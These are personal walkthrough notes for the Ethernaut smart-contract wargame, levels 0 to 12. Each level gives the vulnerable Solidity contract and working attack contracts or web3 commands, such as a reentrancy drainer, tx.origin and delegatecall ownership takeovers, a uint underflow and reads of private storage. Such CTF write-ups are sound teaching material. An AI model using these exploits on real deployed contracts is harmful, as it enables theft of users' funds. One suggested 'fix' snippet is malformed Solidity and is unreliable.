# Ethernaut Notes

## Introduction

The [Ethernaut](https://ethernaut.openzeppelin.com/) is a Web3/Solidity based wargame inspired on [overthewire.org](https://overthewire.org/wargames/), played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'. The game is 100% open source and all levels are contributions made by other players.

<img width="1058" alt="WeChata8e52318016bd83a909b5c9581a24058" src="https://user-images.githubusercontent.com/56213581/184060916-a29a7117-e77b-47a1-888a-23f1f2b20344.png">

![progress](https://user-images.githubusercontent.com/56213581/184060760-bfa4d890-d12e-4167-b22e-c8755c9cdb09.png)

## Levels

### Level 0. Hello Ethernaut

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Instance {

  string public password;
  uint8 public infoNum = 42;
  string public theMethodName = 'The method name is method7123949.';
  bool private cleared = false;

  // constructor
  constructor(string memory _password) public {
    password = _password;
  }

  function info() public pure returns (string memory) {
    return 'You will find what you need in info1().';
  }

  function info1() public pure returns (string memory) {
    return 'Try info2(), but with "hello" as a parameter.';
  }

  function info2(string memory param) public pure returns (string memory) {
    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {
      return 'The property infoNum holds the number of the next info method to call.';
    }
    return 'Wrong parameter.';
  }

  function info42() public pure returns (string memory) {
    return 'theMethodName is the name of the next method.';
  }

  function method7123949() public pure returns (string memory) {
    return 'If you know the password, submit it to authenticate().';
  }

  function authenticate(string memory passkey) public {
    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {
      cleared = true;
    }
  }

  function getCleared() public view returns (bool) {
    return cleared;
  }
}
```

### Level 1. Fallback

**Goal**: This levels requires you to exploit a poorly implemented fallback function to gain control of someone else’s smart contract.

**_What is a Fallback function_**

It is best practice to implement a **simple** Fallback function if you want your smart contract to **_generally_** **receive Ether from other contracts and wallets**.

> The Fallback function enables a smart contract’s inherent ability to act like a wallet.

If I have your wallet address, I can send you Ethers without your permission. In most cases, you might want to enable this ease-of-payment feature for your smart contracts too. This way, other contracts/wallets can send Ether to your contract, without having to know your ABI or specific function names.

> Note: without a fallback, or known payable functions, smart contracts can only receive Ether: i) as a mining bonus, or ii) as the backup wallet of another contract that has **self-destructed**.

The problem is when developers implement key logic _inside the fallback function_.

Such bad practices include: changing contract ownership, transferring the funds, etc. inside the fallback function:

```solidity
receive() external payable {
  require(msg.value > 0 && contributions[msg.sender] > 0);
  owner = msg.sender;
}
```

For more about fallback and receive function read [this](https://betterprogramming.pub/solidity-0-6-x-features-fallback-and-receive-functions-69895e3ffe).

> This is why the fallback function in version 0.6x was split into two separate functions:
>
> - receive() external payable — For empty call data (and any value)
> - fallback() external payable — When no other function matches (not even the receive function). Optionally payable.
>
> This separation provides an alternative to the fallback function for contracts that want to receive plain Ether.

Bad practice: you should not reassign contract ownership in a fallback function

This level demonstrates how you open up your contract to abuse, because **anyone can trigger a fallback function**.

**_Ways to trigger the Fallback function_**

Anyone can call a fallback function by:

1. Calling a **function that doesn’t exist** inside the contract, or
2. Calling a function **without passing in required data**, or
3. Sending **Ether without any data** to the contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    // call this function like:
    // contract.contribute({value: toWei('0.0001', 'ether')})
    // or contract.contribute({value: toWei('0.0001')})
    // notice that the value should be less than 0.001 ether
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}

```

**_Key Security Takeaways_**

- If you implement a fallback function, **keep it simple**
- Use fallback functions to **emit payment events to the transaction log**
- Use fallback functions to **check simple conditional requirements**
- **Think twice** before using fallback functions to change contract ownership, transfer funds, support low-level function calls, and more.

### Level 2. Fallout

**Goal**: Gain control of someone else’s smart contract.

Notice Fallout() is misspelled as Fal1out(), causing the constructor function to become a public function that you can call anytime.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
	        require(
	            msg.sender == owner,
	            "caller is not the owner"
	        );
	        _;
	    }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

### Level 3. Coin Flip

**Goal**: This levels requires you to correctly guess the outcome of a coin flip, **ten times in a row.**

**_How Ethereum generate "randomness"_**

> There’s no true randomness on Ethereum blockchain, only random generators that are considered “good enough”.

Developers currently create psuedo-randomness in Ethereum by hashing variables that are **unique**, or **difficult to tamper with**. Examples of such variables include `transaction timestamp`, `sender address`, `block height, etc`.

Ethereum then offers two main cryptographic hashing functions, namely, SHA-3 and the newer KECCAK256, which hash the concatenation string of these input variables.

This generated hash is finally converted into a large integer, and then mod’ed by n. This is to get a discrete set of probability integers, inside the desired range of 0 to n.

> Notice that in our Ethernaut exercise, n=2 to represent the two sides of a coin flip.
> Example of input variables that are often cryptographically hashed
> ![](https://miro.medium.com/max/1400/1*c7aNl-L0RjDq4EWdDOfaGw.png)

**This method of deriving pseudo-randomness in smart contracts makes them vulnerable to attack. Adversaries who know the input, can thus guess the “random” outcome.**

This is the key to solving your CoinFlip level. Here, the input variables that determine the coin flip are publicly available to you.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ICoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract HackFlip {
  uint256 public consecutiveWins = 0;
  uint256 lastHash;
  uint256 public FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  function coinFlipGuess(address _coinFlipAddr) external returns (uint256) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    bool isRight = ICoinFlip(_coinFlipAddr).flip(side);
    if (isRight) {
        consecutiveWins++;
    } else {
        consecutiveWins = 0;
    }

    return consecutiveWins;
  }
}
```

Now, simply call `coinFlipGuess` method (on Remix) with `<your-instance-address>` as only parameter, 10 times with successful transaction.

Go back to console and query `consecutiveWins` from `CoinFlip` instance:

```js
await contract.consecutiveWins().then((v) => v.toString());
// Output: '10'
```

Useful links:

- [Deploy contract on Rinkeby using Remix and MetaMask](https://ethereum.stackexchange.com/questions/110094/can-i-connect-to-rinkeby-using-remix-and-metamask)
- Solidity - interacting with a deployed contract at an address. Read [this](https://solidity-by-example.org/interface/) or better watch [this](https://www.youtube.com/watch?v=YWtT0MNHYhQ)

### Level 4. Telephone

**Goal**: Gain control of someone else’s smart contract.

[Difference between tx.origin and msg.sender](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)

While this example may be simple, confusing tx.origin with msg.sender can lead to phishing-style attacks, such as [this](https://blog.ethereum.org/2016/06/24/security-alert-smart-contract-wallets-created-in-frontier-are-vulnerable-to-phishing-attacks/) and [this](https://hackernoon.com/hacking-solidity-contracts-using-txorigin-for-authorization-are-vulnerable-to-phishing).

An example of a possible attack is outlined below.

1. Use tx.origin to determine whose tokens to transfer, e.g.
   `function transfer(address _to, uint _value) { tokens[tx.origin] -= _value; tokens[_to] += _value; }`

2. Attacker gets victim to send funds to a malicious contract that calls the transfer function of the token contract, e.g.
   `function () payable { token.transfer(attackerAddress, 10000); }`

3. In this scenario, tx.origin will be the victim's address (while msg.sender will be the malicious contract's address), resulting in the funds being transferred from the victim to the attacker.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

`player` will call `HackTelephone` contract's `telephone`, which in turn will call `Telephone`'s `changeOwner` with `msg.sender` (which is `player`) as param. In that case `tx.origin` is `player` and `msg.sender` is `HackTelephone`'s address. And since now `tx.origin != msg.sender`, `player` has claimed the ownership.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract HackTelephone {
    function telephone(address _telephoneAddr) external {
        ITelephone(_telephoneAddr).changeOwner(0xc85cD8feb12dBFBCA493C8F80b2F93161D0df642);
    }
}
```

### Level 5. Token

**Goal**: `player` is initially assigned 20 tokens i.e. `balances[player] = 20` and has to somehow get any additional tokens (so that `balances[player] > 20` ).

Integer [overflow/underflow](https://docs.soliditylang.org/en/v0.6.0/security-considerations.html#two-s-complement-underflows-overflows) in Solidity 0.6.0

Overflows are very common in solidity and must be checked for with control statements such as:
`if(a + c > a) { a = a + c; }`
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:
`a = a.add(c);`
If there is an overflow, the code will revert.

The `transfer` method of `Token` performs some unchecked arithmetic operations on `uint256` (`uint` is shorthand for `uint256` in Solidity) integers. That is prone to underflow.

The max value of a 256 bit unsigned integer can represent is 2<sup>256</sup> − 1, which is -
`115,792,089,237,316,195,423,570,985,008,687,907,853,269,984,665,640,564,039,457,584,007,913,129,639,935`

Hence `uint256` can only comprise values from `0` to `2^256 - 1` only. Any addition/subtraction would cause overflow/underflow. For example:

```
Let M = 2^256 - 1 (max value of uint256)

0 - 1 = M

M + 1 = 0

20 - 21 = M

(All numbers are 256-bit unsigned integers)
```

We're going to use last expression from example above to exploit the contract.

Let's call `transfer` with a zero address (or any address other than `player`) as `_to` and 21 as `_value` to transfer.

```js
// balances[msg.sender] = 20 - 21 = 2^256 - 1
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```

A nice thing to note is that it worked because contract's compiler version is `v0.6.0`. This, most probably, **won't work for latest version** because underflow/overflow causes failing assertion by default in latest version.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

My Solution (w/o using overflow):

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IToken {
    function transfer(address _to, uint _value) external returns (bool);
}

contract HackToken {
    function hackToken(address _tokenAddr) external {
        // transfer to my address 21000000 tokens from this contract address:
        IToken(_tokenAddr).transfer(0xc85cD8feb12dBFBCA493C8F80b2F93161D0df642, 21000000);
    }
}
```

Useful links:
[Who is msg.sender when calling a contract from a contract](https://ethereum.stackexchange.com/questions/28972/who-is-msg-sender-when-calling-a-contract-from-a-contract)

### Level 6. Delegation

**Goal**: Gain control of someone else’s smart contract.

Usage of `delegatecall` is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The `delegatecall` function is a powerful feature, but a dangerous one, and must be used with extreme care.

Please refer to the [The Parity Wallet Hack Explained](https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7/) article for an accurate explanation of how this idea was used to steal 30M USD.

![](https://miro.medium.com/max/1400/1*907YyYjEuAZCeLT9XiOA7A.png)

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

A simple one if you clearly understand how `delegatecall` works, which is being used in `fallback` method of `Delegation`.

We just have to send function signature of `pwn` method of `Delegate` as `msg.data` to `fallback` so that _code_ of `Delegate` is executed in the context of `Delegation`. That changes the ownership of `Delegation`.

So, first get encoded function signature of `pwn`, in console:

```js
signature = web3.eth.abi.encodeFunctionSignature("pwn()");
```

Then we send a transaction with `signature` as data, so that `fallback` gets called:

```js
await contract.sendTransaction({ from: player, data: signature });
```

### Level 7. Force (\*\*\*)

In solidity, for a contract to be able to receive ether, the fallback function must be marked **payable**.

However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant `address(this).balance == 0` for any contract logic.

`player` has to somehow make this empty contract's balance grater that 0.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

Simple `transfer` or `send` won't work because the `Force` implements neither `receive` nor `fallaback` functions. Calls with any value will revert.

However, the checks can be bypassed by using `selfdestruct` of an intermediate contract - `Payer` which would specify `Force`'s address as beneficiary of it's funds after it's self-destruction.

Solution:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackForce {
    uint public balance = 0;

    function destruct(address payable _to) external payable {
        selfdestruct(_to);
    }

    function deposit() external payable {
        balance += msg.value;
    }
}
```

Send a value of say, `10000000000000 Wei` (0.00001 eth) by calling `deposit`, so that `Payer`'s balance increases to same amount.

Call `destruct` of Payer with `<instance-address> ` as parameter. That's destroy `Payer` and send all of it's funds to `Force`.

### Level 8. Vault

**Goal**: `player` has to set locked to false.

It's important to remember that marking a variable as private **_only prevents other contracts from accessing it_**. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) (RSA (Rivest–Shamir–Adleman, a public-key cryptosystem) and Zero-Knowledge Proofs) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Only way is by calling `unlock` by correct password.

Although `password` state variable is private, one can still read a storage variable by determining it's storage slot. Therefore sensitive information should not be stored on-chain, even if it is specified `private`.

Above, the `password` is at a storage slot of 1 in `Vault`.

Read the password:

```js
// e is null/event here
await web3.eth.getStorageAt(instance, 1, (e, v) => console.log(v));
// or
await web3.eth.getStorageAt(instance, 1, (e, v) =>
  console.log(web3.utils.toAscii(v))
);
// or
password = await web3.eth.getStorageAt(contract.address, 1);
```

Useful links:

- [How do I see the value of a string stored in a private variable?](https://ethereum.stackexchange.com/questions/44893/how-do-i-see-the-value-of-a-string-stored-in-a-private-variable)
- [Solidity - Variables](https://www.tutorialspoint.com/solidity/solidity_variables.htm)
  - **State Variables** − Variables whose values are permanently stored in a contract storage.
  - **Local Variables** − Variables whose values are present till function is executing.
  - **Global Variables** − Special variables exists in the global namespace used to get information about the blockchain.

### Level 9. King

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

**Goal**: `player` has to prevent the current level from reclaiming the kingship after instance is submitted.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value); // <===
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

Kingship is switched in `receive` function i.e. when a specific value is sent to `King`. So, we'll have to somehow prevent execution of `receive`.

The key thing to notice is that previous `king` is sent back `msg.value` using `transfer`. But what if this previous `king` was a contract and it didn't implement any `receive` or `fallback`? It won't be able to receive any value. `transfer` stops execution with an exception (unlike `send`).

Solution: (a contract `HackKing` that has NO `receive` or `fallback`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract HackKing {
    function claimKingship(address payable _to) public payable {
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent, "Failed to send value");
    }
}
```

Call `claimKingship` of `HackKing` with param `<instance-address>` and set the amount `1000000000000000 Wei` as value in Remix. That will make `HackKing` contract as king.

Submit the instance. Upon submitting the level will try to reclaim kingship through `receive` fallback. However, it will fail.

This is because upon reaching line:

```
king.transfer(msg.value);
```

exception would occur because `king` (i.e. deployed `HackKing` contract) has no fallback functions.

Bonus thing to note here is that in `HackKing`'s `claimKingship`, call is used specifically. `transfer` or `send` will fail because of limited 2300 gas stipend. `receive` of `King` would require more than 2300 gas to execute successfully.

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).

Useful links:

- Solidity contract [receive](https://ethereum.stackexchange.com/questions/81994/what-is-the-receive-keyword-in-solidity/81995) function
- [transfer](https://docs.soliditylang.org/en/v0.8.10/types.html#members-of-addresses) method of addresses
- (\*) Difference between send and transfer, read [this](https://ethereum.stackexchange.com/questions/79924/what-is-the-core-difference-between-send-and-transfer-method-of-address-payable) and [this](https://ethereum.stackexchange.com/questions/19341/address-send-vs-address-transfer-best-practice-usage)
- [The 2300 gas stipend](https://hackmd.io/@vbuterin/evm_feature_removing)

### Level 10. Re-entrancy

**Goal**: `player` has to steal all of the contract's funds.

Things that might help:

- Untrusted contracts can execute code where you least expect it.
- Fallback methods
- Throw/revert bubbling
- Sometimes the best way to attack a contract is with another contract.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) { // <==
      (bool result,) = msg.sender.call{value:_amount}(""); // <==
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount; // <==
    }
  }

  receive() external payable {}
}
```

We're going to attack `Reentrance` with our written contract `ReentrancyAttack`. Deploy it with target contract (`Reentrance`) address:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentrancyAttack {
    address public owner;
    IReentrance targetContract;
    uint targetValue = 1000100000000000;

    constructor(address _targetAddr) {
        targetContract = IReentrance(_targetAddr);
        owner = msg.sender;
    }

    function balance() public view returns (uint) {
        return address(this).balance;
    }

    function donateAndWithdraw() public payable {
        require(msg.value >= targetValue);
        targetContract.donate{value: msg.value}(address(this));
        targetContract.withdraw(msg.value);
    }

    function withdrawAll() public returns (bool) {
        require(msg.sender == owner, "it's my money!");
        uint totalBalance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: totalBalance}("");
        // require(sent, "Failed to send Ether");
        return sent;
    }

    receive() external payable { // <== [1]
        uint targetBalance = address(targetContract).balance;
        if (targetBalance >= targetValue) targetContract.withdraw(targetValue);
    }
}
```

Now call `donateAndWithdraw` of `ReentrancyAttack` with value of `1000000000000000 wei` (`0.001 ether`) and chain reaction starts:

- First `targetContract.donate.value(msg.value)(address(this))` causes the `balances[msg.sender]` of `Reentrance` to set to sent amount. `donate` of `Reentrance` finishes it's execution
- Immediately after, `targetContract.withdraw(msg.value)` invokes `withdraw` of `Reentrance`, which sends the same donated amount back to `ReentrancyAttack`.
- `receive` of `ReentrancyAttack` is invoked. Note that `withdraw` hasn't finished execution yet! So still `balances[msg.sender]` is equal to initially donated amount. Now we call `withdraw` of `ReentrancyAttack` again in `receive`.
- Second invocation of `withdraw` executes and it's passes the require statement this time again! So, it sends the `msg.sender` (`ReentrancyAttack` address) that amount again!
- Simple arithmetic plays out and recursive execution is halted only when balance of `Reentrance` is reduced to 0. **[1]**

![](https://miro.medium.com/max/1400/1*HGRY9Lbox56-o9nbCgBepg.jpeg)

**_The DAO Hack_**

The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See [15 lines of code that could have prevented TheDAO Hack](https://blog.openzeppelin.com/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942/).

- Check out the full [analysis of the DAO hack](https://hackingdistributed.com/2016/06/18/analysis-of-the-dao-exploit/) here.
- To those interested, the Re-entrancy attack was responsible for the [infamous DAO hack of 2016](https://www.gemini.com/cryptopedia/the-dao-hack-makerdao#section-what-is-a-dao) which shook the whole Ethereum community. $60 million dollars of funds were stolen. Later, Ethereum blockchain was hard forked to restore stolen funds, but not all parties consented to decision. That led to splitting of network into distinct chains - Ethereum and Ethereum Classic.

**_Key Security Takeaways_**

- The order of execution really matters in Solidity. If you must make external function calls, make the last thing you do (after all requisite checks and balances):
  ```solidity
  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
        balances[msg.sender] -= _amount;
        if(msg.sender.transfer(_amount)()) {
            _amount;
        }
    }
  }
  // Or even better, invoke transfer in a separate function
  ```
- Include a **mutex** to prevent re-entrancy, e.g. use a boolean **lock** variable to signal execution depth.
- Be careful when using **function modifiers** to check invariants: modifiers are executed at the start of the function. If the variable state will change during the entirety of the function, consider extracting the modifier into a check placed at the correct line in the function.
- ❌ “Use `transfer` to move funds out of your contract, since it `throw`s and limits gas forwarded. Low level functions like `call` and `send` just return false but don't interrupt the execution flow when the receiving contract fails.” — from Ethernaut level
  - `transfer` and `send` are no longer recommended solutions as they can potentially break contracts after the Istanbul hard fork. [Source 1](https://consensys.net/diligence/blog/2019/09/stop-using-soliditys-transfer-now/) [Source 2](https://forum.openzeppelin.com/t/reentrancy-after-istanbul/1742)
- Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and _re-enter_ your contract, possibly messing up your state/logic.
- Re-entrancy is a common attack. You should always be prepared for it!

### Level 11. Elevator

**Goal**: `player` has to set top to true i.e. have to reach top of the building.

Given contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

Solution: ([Solidity inheritance](https://www.geeksforgeeks.org/solidity-inheritance/))

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

interface IElevator {
    function goTo(uint _floor) external;
}

contract MyBuilding is Building {

    bool public isLast = true;

    function isLastFloor(uint _n) override external returns (bool) {
        isLast = !isLast;
        return isLast;
    }

    function callGoTo(address _elevatorAddr) public {
        IElevator(_elevatorAddr).goTo(1);
    }
}
```

or

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {
    IElevator public el = IElevator(0xB5A83695305eCaF30Beed5DbC5B4fbA9C307608c);
    bool public switchFlipped = false;

    function hack() public {
        el.goTo(1);
    }

    function isLastFloor(uint) public returns (bool) {
        if (!switchFlipped) { // first call
            switchFlipped = true;
            return false;
        } else { // second call
          switchFlipped = false;
          return true;
        }
    }
}
```

Although we did implement `isLastFloor`, we won't use `_floor` param anywhere to determine if it's last floor. We are not obliged to anyway.

We just alternate between returning `true` and `false`, so that 1st call will return `false` and 2nd call returns `true` and so on.

Simply call `callGoTo` of `MyBuilding`, with contract.address of instance. That'll trigger `Elevator` to call `isLastFloor` of our contract - `MyBuilding`. And since second call sets `top` variable, it is set to `true`.

**_Key Security Takeaways_**

- You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation and learn its caveats](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions).
- An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.

Useful links:

- Solidity [interfaces](https://docs.soliditylang.org/en/v0.8.10/contracts.html#interfaces)

### Level 12. Privacy (\*\*\*\*)

**Goal**: `player` has to set `locked` state variable to `false`.

Refer to [Level 8](#level-8-vault) about layout of state variables in a Solidity contract and reading storage at a slot.

To solve this level, let’s dive deeper into how Ethereum optimises data storage. But first, make sure you know how to read storage on the blockchain.

![](https://miro.medium.com/max/1400/1*wY8Si-mt_QZWqg0jnEDw8A.jpeg)
![](https://miro.medium.com/max/1400/1*g3odw8DHxmw0YPrhqDf3oA.jpeg)
![](https://miro.medium.com/max/1400/1*Zl3EkleTiPQEssEsu44MuA.jpeg)

**Exceptions**:

1. **`constants`** are not stored in storage. From Ethereum [documentation](https://docs.soliditylang.org/en/latest/contracts.html#constants), that the compiler does not reserve a storage slot for `constant` variables. This means you won’t find the following in any storage slots:

```solidity
contract A {
    uint public constant number = ...; //not stored in storage
}
```

2. **`Mappings`** and **`dynamically-sized arrays`** do not stick to these conventions. More on this at a later level.

Given Contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

`unlock` uses the third entry (index 2) of `data` which is a `bytes32` array. Let's determined `data`'s third entry's slot number (each slot can accommodate at most 32 bytes) according to storage rules:

- `locked` is 1 byte `bool` in slot 0.
- `ID` is a 32 byte `uint256`. It is 1 byte extra big to be inserted in slot 0. So it goes in & totally fills slot 1.
- `flattening` - a 1 byte `uint8`, `denomination` - a 1 byte `uint8` and `awkwardness` - a 2 byte `uint16` totals 4 bytes. So, all three of these go into slot 2.
- Array data always start a new slot, so `data` starts from slot 3. Since it is `bytes32` array each value takes 32 bytes. Hence value at index 0 is stored in slot 3, index 1 is stored in slot 4 and index 2 value goes into slot 5.

Alright so key is in slot 5 (index 2 / third entry). Read it.

```js
key = await web3.eth.getStorageAt(contract.address, 5);
```

This `key` is 32 byte. But `require` check in `unlock` converts the `data[2]` 32 byte value to a `byte16` before matching.

`byte16(data[2])` will truncate the last 16 bytes of `data[2]` and return only the first 16 bytes.

Accordingly convert `key` to a 16 byte hex (with prefix - `0x`):

```js
key = key.slice(0, 34); // <== 34 = 2 * 16 + 2 since 1 byte = 8 bits = 2 hex digits
```

Nothing in the ethereum blockchain is private. The keyword private is merely an artificial construct of the Solidity language. Web3's `getStorageAt(...)` can be used to read anything from storage. It can be tricky to read what you want though, since several optimization rules and techniques are used to compact the storage as much as possible.

It can't get much more complicated than what was exposed in this level. For more, check out this excellent article by "Darius": [How to read Ethereum contract storage](https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925)

**_Key Security Takeaways_**

- In general, excessive slot usage wastes gas, especially if you declared structs that will reproduce many instances. **Remember to optimize your storage to save gas!**
